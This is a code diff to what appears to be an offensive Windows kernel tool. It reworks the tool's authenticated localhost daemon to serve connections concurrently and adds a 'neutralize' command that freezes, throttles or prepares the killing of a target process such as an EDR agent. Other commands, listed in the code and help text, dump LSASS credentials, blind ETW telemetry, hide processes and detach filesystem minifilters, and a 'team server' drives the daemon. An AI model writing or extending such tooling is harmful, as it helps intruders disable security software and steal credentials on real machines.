@@ -26,10 +26,11 @@
 //! Daemon mode (`--serve <port>`): persistent kernel session over localhost
 //! TCP. The daemon REFUSES to start without the `NYX_DAEMON_TOKEN` env var
 //! (shared secret). The FIRST line of every connection must be `auth <token>`
-//! (constant-time compare); wrong/absent token closes the connection with an
-//! error line. Ops are JSON lines `{"op":"...","pid":N}` → JSON reply
-//! lines, rate-limited per connection (60 ops/min). pid-taking ops reject
-//! pid <= 0 or absent.
+//! (constant-time compare), answered with `{"ok":true}`; wrong/absent token
+//! closes the connection with an error line. Ops are JSON lines
+//! `{"op":"...","pid":N}` → JSON reply lines, rate-limited per connection
+//! (60 ops/min). pid-taking ops reject pid <= 0 or absent. Lines longer than
+//! 16 KiB close the connection.
 //!
 //! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
 //! All offsets come from the build table (`for_build`) or pattern scan.
@@ -175,7 +176,7 @@ fn main() {
                 std::process::exit(7);
             }
         };
-        return run_daemon(tier, build, port, token);
+        run_daemon(tier, build, port, token);
     }
 
     // ---- 6. Dispatch the requested command ----
@@ -365,7 +366,7 @@ fn main() {
                     eprintln!("[!] ntdll not found");
                     std::process::exit(5);
                 }
-                winapi_get_proc_address(ntdll, "NtContinue\0".as_ptr())
+                winapi_get_proc_address(ntdll, c"NtContinue".as_ptr().cast::<u8>())
             };
             if nt_continue.is_null() {
                 eprintln!("[!] NtContinue not found in ntdll");
@@ -376,7 +377,7 @@ fn main() {
 
             let init_block = unsafe {
                 let ntdll = winapi_get_module_handle("ntdll.dll\0");
-                winapi_get_proc_address(ntdll, "LdrSystemDllInitBlock\0".as_ptr())
+                winapi_get_proc_address(ntdll, c"LdrSystemDllInitBlock".as_ptr().cast::<u8>())
             };
             if init_block.is_null() {
                 eprintln!("[!] LdrSystemDllInitBlock not found");
@@ -558,11 +559,31 @@ fn detect_build() -> u32 {
 #[cfg(target_os = "windows")]
 const MAX_OPS_PER_MINUTE: usize = 60;
 
-/// Run the kernel-tier daemon: bind a localhost TCP socket, accept one
-/// connection at a time, and dispatch JSON ops against the live `tier`.
-/// Every connection MUST open with `auth <token>` (constant-time compare
-/// against the NYX_DAEMON_TOKEN secret). After that, each op is a single
-/// line `{"op":"...","pid":N}`; the reply is a single line JSON
+/// Hard cap on a single daemon line (auth line or op line). The wire protocol
+/// is JSON lines with tiny payloads, so anything longer is garbage or a
+/// protocol violation — the connection is closed (framing is unrecoverable
+/// past the cap).
+#[cfg(target_os = "windows")]
+const MAX_LINE_BYTES: usize = 16 * 1024;
+
+/// Message passed between the daemon's threads. `Conn` carries a freshly
+/// accepted socket to a per-connection thread; `Op` carries one op line from a
+/// connection thread back to the single dispatcher — the only thread allowed
+/// to touch the `tier`, whose kit trait-objects are not `Send`.
+#[cfg(target_os = "windows")]
+enum DaemonMsg {
+    Conn(std::net::TcpStream),
+    Op(String, std::sync::mpsc::Sender<String>),
+}
+
+/// Run the kernel-tier daemon: bind a localhost TCP socket and serve one or
+/// more connections concurrently. The accept loop never blocks on a client —
+/// each connection is handled on its own thread (auth + op I/O), and kernel
+/// ops are serialised through a single dispatcher on the daemon thread that
+/// owns the live `tier`. Every connection MUST open with `auth <token>`
+/// (constant-time compare against the NYX_DAEMON_TOKEN secret) within a 10s
+/// auth-wait. After that, each op is a single line
+/// `{"op":"...","pid":N}`; the reply is a single line JSON
 /// `{"ok":true,...}` or `{"ok":false,"err":"..."}`. Ops are
 /// rate-limited per connection (MAX_OPS_PER_MINUTE).
 #[cfg(target_os = "windows")]
@@ -572,12 +593,9 @@ fn run_daemon(
     port: u16,
     token: String,
 ) -> ! {
-    use nyx_operator_kernelsdk::{
-        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
-    };
-    use std::io::{BufRead, BufReader, Write};
     use std::net::TcpListener;
-    use std::time::{Duration, Instant};
+    use std::sync::mpsc;
+    use std::thread;
 
     let bind = format!("127.0.0.1:{port}");
     let listener = match TcpListener::bind(&bind) {
@@ -591,77 +609,197 @@ fn run_daemon(
         }
     };
 
-    for stream in listener.incoming() {
-        let mut stream = match stream {
-            Ok(s) => s,
-            Err(e) => {
-                eprintln!("[!] accept failed: {e}");
-                continue;
-            }
-        };
-        let peer = stream
-            .peer_addr()
-            .map(|a| a.to_string())
-            .unwrap_or_else(|_| "?".into());
+    let (tx, rx) = mpsc::channel::<DaemonMsg>();
 
-        // ---- Token challenge: the FIRST line must be `auth <token>`. ----
-        // Bound the auth wait so a client that connects and never sends a
-        // token cannot wedge the single-connection daemon.
-        let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
-        let reader = BufReader::new(stream.try_clone().expect("clone stream"));
-        let mut lines = reader.lines();
-        let authed = match lines.next() {
-            Some(Ok(line)) => check_auth(line.trim(), &token),
-            _ => false,
-        };
-        if !authed {
-            eprintln!("[*] daemon: {peer} auth failed — closing");
-            let _ = stream.write_all(b"{\"ok\":false,\"err\":\"auth failed\"}\n");
-            continue;
-        }
-        // Auth done; lift the read timeout (authenticated sessions may be
-        // long-lived — the team server holds the connection between ops).
-        let _ = stream.set_read_timeout(None);
-        eprintln!("[*] daemon: client {peer} authenticated");
-
-        // ---- Per-connection op loop with rate limiting (60 ops/min). ----
-        let mut op_times: Vec<Instant> = Vec::new();
-        for line in lines {
-            let line = match line {
-                Ok(l) => l,
-                Err(_) => break,
+    // ---- Accept thread: keep accepting even while a client is slow/idle. ----
+    let accept_tx = tx.clone();
+    thread::spawn(move || {
+        for stream in listener.incoming() {
+            let stream = match stream {
+                Ok(s) => s,
+                Err(e) => {
+                    eprintln!("[!] accept failed: {e}");
+                    continue;
+                }
             };
-            let trimmed = line.trim();
-            if trimmed.is_empty() {
-                continue;
-            }
-            let now = Instant::now();
-            op_times.retain(|t| now.duration_since(*t) < Duration::from_secs(60));
-            let reply = if op_times.len() >= MAX_OPS_PER_MINUTE {
-                json_err("rate limit exceeded (60 ops/min per connection)")
-            } else {
-                op_times.push(now);
-                dispatch_daemon_op(trimmed, &tier, build)
-            };
-            let reply_line = format!("{reply}\n");
-            if stream.write_all(reply_line.as_bytes()).is_err() {
+            if accept_tx.send(DaemonMsg::Conn(stream)).is_err() {
+                // Dispatcher gone — daemon is shutting down.
                 break;
             }
-            eprintln!("[*] daemon: {peer} → {trimmed} → {reply}");
         }
-        eprintln!("[*] daemon: client {peer} disconnected");
+    });
+
+    // ---- Dispatcher (this thread): owns the tier, runs ops one at a time. ----
+    // Connection threads never touch the tier (the kit trait-objects aren't
+    // Send); they submit (line, reply_tx) pairs and wait for the reply.
+    while let Ok(msg) = rx.recv() {
+        match msg {
+            DaemonMsg::Conn(stream) => {
+                let peer = stream
+                    .peer_addr()
+                    .map(|a| a.to_string())
+                    .unwrap_or_else(|_| "?".into());
+                let conn_tx = tx.clone();
+                let token = token.clone();
+                // Per-connection thread: one slow/stuck client can no longer
+                // block the accept loop or starve other connections.
+                thread::spawn(move || serve_connection(stream, &peer, &token, &conn_tx));
+            }
+            DaemonMsg::Op(line, reply_tx) => {
+                let reply = dispatch_daemon_op(&line, &tier, build);
+                // A dropped receiver means the connection died mid-op; the
+                // reply is simply discarded.
+                let _ = reply_tx.send(reply);
+            }
+        }
     }
-    // listener.incoming() only ends on error; unreachable in practice.
-    unreachable!("daemon listener loop exited");
+    // The channel only closes when every sender (accept thread + all
+    // connection threads) has died — the daemon is broken by then.
+    unreachable!("daemon channel closed (all senders dropped)");
+}
+
+/// Serve one daemon connection: token challenge (bounded by a 10s auth-wait)
+/// then the per-connection op loop. Lines longer than [`MAX_LINE_BYTES`] close
+/// the connection (the protocol can't frame-recover from an oversized line); a
+/// bad op line is answered with `{"ok":false,...}` and the loop continues.
+/// Kernel dispatch is delegated to the daemon's dispatcher thread.
+#[cfg(target_os = "windows")]
+fn serve_connection(
+    mut stream: std::net::TcpStream,
+    peer: &str,
+    token: &str,
+    tx: &std::sync::mpsc::Sender<DaemonMsg>,
+) {
+    use std::io::{BufRead, BufReader, Write};
+    use std::sync::mpsc;
+    use std::time::{Duration, Instant};
+
+    // ---- Token challenge: the FIRST line must be `auth <token>`. ----
+    // Bound the auth wait so a client that connects and never sends a token
+    // cannot wedge a connection thread forever.
+    let read_stream = match stream.try_clone() {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+    if read_stream.set_read_timeout(Some(Duration::from_secs(10))).is_err() {
+        return;
+    }
+    let mut reader = BufReader::new(read_stream);
+    let mut line_buf: Vec<u8> = Vec::with_capacity(256);
+    let authed = match read_line_capped(&mut reader, &mut line_buf) {
+        Ok(true) => check_auth(std::str::from_utf8(&line_buf).unwrap_or(""), token),
+        _ => false,
+    };
+    if !authed {
+        eprintln!("[*] daemon: {peer} auth failed — closing");
+        let _ = stream.write_all(b"{\"ok\":false,\"err\":\"auth failed\"}\n");
+        return;
+    }
+    // Auth ok — reply `{"ok":true}` per the documented wire protocol
+    // (`auth <token>` → `{"ok":true}`), then lift the read timeout
+    // (authenticated sessions may be long-lived — the team server holds the
+    // connection between ops).
+    if stream.write_all(b"{\"ok\":true}\n").is_err() {
+        return;
+    }
+    let _ = reader.get_mut().set_read_timeout(None);
+    eprintln!("[*] daemon: client {peer} authenticated");
+
+    // ---- Per-connection op loop with rate limiting (60 ops/min). ----
+    let mut op_times: Vec<Instant> = Vec::new();
+    while let Ok(true) = read_line_capped(&mut reader, &mut line_buf) {
+        // EOF, read error, or oversized line → close the connection.
+        let line = std::str::from_utf8(&line_buf).unwrap_or("");
+        let trimmed = line.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        let now = Instant::now();
+        op_times.retain(|t| now.duration_since(*t) < Duration::from_secs(60));
+        let reply = if op_times.len() >= MAX_OPS_PER_MINUTE {
+            json_err("rate limit exceeded (60 ops/min per connection)")
+        } else {
+            op_times.push(now);
+            // Hand the op to the single dispatcher (serialises kernel access)
+            // and wait for the reply. A dead dispatcher = the daemon is
+            // shutting down; drop the connection rather than hang it.
+            let (reply_tx, reply_rx) = mpsc::channel();
+            if tx.send(DaemonMsg::Op(trimmed.to_string(), reply_tx)).is_err() {
+                break;
+            }
+            match reply_rx.recv() {
+                Ok(r) => r,
+                Err(_) => break,
+            }
+        };
+        let reply_line = format!("{reply}\n");
+        if stream.write_all(reply_line.as_bytes()).is_err() {
+            break;
+        }
+        eprintln!("[*] daemon: {peer} → {trimmed} → {reply}");
+    }
+    eprintln!("[*] daemon: client {peer} disconnected");
+}
+
+/// Read one `\n`-terminated line (the `\n` included) into `out`, bounded by
+/// [`MAX_LINE_BYTES`]. Returns `Ok(true)` when a line was read, `Ok(false)` on
+/// clean EOF (or a read error — timeout/dead peer), and `Err` when the line
+/// exceeded the cap: the peer is either hostile or broken, and since framing
+/// is unrecoverable past the cap, the caller must close the connection.
+#[cfg(target_os = "windows")]
+fn read_line_capped<R: std::io::BufRead>(reader: &mut R, out: &mut Vec<u8>) -> std::io::Result<bool> {
+    out.clear();
+    loop {
+        let avail = match reader.fill_buf() {
+            Ok(a) => a,
+            // Read timeout (auth wait) or a dead peer — treat as EOF; the
+            // caller's auth/op loop decides what that means.
+            Err(_) => return Ok(false),
+        };
+        if avail.is_empty() {
+            return Ok(false);
+        }
+        match avail.iter().position(|b| *b == b'\n') {
+            Some(idx) => {
+                // The cap must be checked HERE too, not just in the
+                // no-newline branch: a newline can arrive inside a chunk that
+                // crosses the cap boundary, and the completed line would still
+                // exceed the cap.
+                let take = idx + 1;
+                if out.len() + take > MAX_LINE_BYTES {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::InvalidData,
+                        "line exceeds 16 KiB cap",
+                    ));
+                }
+                out.extend_from_slice(&avail[..take]);
+                reader.consume(take);
+                return Ok(true);
+            }
+            None => {
+                out.extend_from_slice(avail);
+                let n = avail.len();
+                reader.consume(n);
+                if out.len() > MAX_LINE_BYTES {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::InvalidData,
+                        "line exceeds 16 KiB cap",
+                    ));
+                }
+            }
+        }
+    }
 }
 
 /// Dispatch one daemon op. Tiny hand-rolled JSON parser (no serde dep) — we
-/// only recognise `op` (string) and `pid` (number). Returns a JSON reply line.
-/// pid-taking ops (`dump-lsass`, `hide`) reject pid <= 0 or absent.
+/// only recognise `op` (string), `pid` (number) and `method` (string, for
+/// `neutralize`). Returns a JSON reply line. pid-taking ops (`dump-lsass`,
+/// `hide`, `neutralize`) reject pid <= 0 or absent.
 #[cfg(target_os = "windows")]
 fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
     use nyx_operator_kernelsdk::{
-        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
+        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, NeutralizeMethod,
+        ProcHideKit,
     };
 
     let op = json_string_field(line, "op").unwrap_or_default();
@@ -729,6 +867,38 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
                 }
             } else {
                 json_err("minifilter kit not assembled (supply --flt-rva)")
+            }
+        }
+        "neutralize" => {
+            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
+                return json_err("neutralize requires pid > 0");
+            };
+            let method = json_string_field(line, "method").unwrap_or_default();
+            let m = match method.as_str() {
+                "freeze" => NeutralizeMethod::Freeze,
+                "choke" => NeutralizeMethod::Choke,
+                "kill" => NeutralizeMethod::Kill,
+                _ => return json_err("neutralize requires method freeze|choke|kill"),
+            };
+            if let Some(neu) = &tier.neutralize {
+                match m {
+                    // neutralize(Kill) on the trait ALWAYS errors (no KernelRw
+                    // param). Use the dedicated kill() to resolve the target
+                    // EPROCESS KVA — the actionable artifact for the driver's
+                    // terminate IOCTL / PplStripper flow.
+                    NeutralizeMethod::Kill => match neu.kill_kva(&*tier.rw, pid) {
+                        Ok(kva) => format!(
+                            r#"{{"ok":true,"action":"kill","eprocess_kva":"0x{kva:x}","note":"terminate via driver IOCTL or PplStripper"}}"#
+                        ),
+                        Err(e) => json_err(&format!("kill: {e:?}")),
+                    },
+                    freeze_or_choke => match neu.neutralize(pid, freeze_or_choke) {
+                        Ok(()) => json_ok(),
+                        Err(e) => json_err(&format!("neutralize: {e:?}")),
+                    },
+                }
+            } else {
+                json_err("neutralize kit not assembled")
             }
         }
         "status" => {
@@ -830,8 +1000,9 @@ Commands:
 
 Daemon mode (--serve <port>):
   Persistent kernel session over 127.0.0.1:<port> (one bootstrap amortised
-  across ops; one connection served at a time). The daemon REFUSES to start
-  without the NYX_DAEMON_TOKEN environment variable (shared secret).
+  across ops; connections served concurrently, ops serialised). The daemon
+  REFUSES to start without the NYX_DAEMON_TOKEN environment variable (shared
+  secret).
 
   Wire protocol (JSON lines; first line of EVERY connection):
     auth <token>                           -> {"ok":true} (else error + close)
@@ -839,11 +1010,12 @@ Daemon mode (--serve <port>):
     {"op":"blind-etw"}                    -> {"ok":true}
     {"op":"hide","pid":1234}             -> {"ok":true}
     {"op":"detach-minifilter"}            -> {"ok":true}
+    {"op":"neutralize","pid":1234,"method":"freeze|choke|kill"} -> {"ok":true}
     {"op":"status"}                       -> {"ok":true,"build":N,...}
 
   Wrong/absent token closes the connection with an error line. pid-taking
   ops reject pid <= 0 or absent. Ops are rate-limited per connection
-  (60/min)."#
+  (60/min). Lines longer than 16 KiB close the connection."#
 }
 
 // ---- Helpers ----
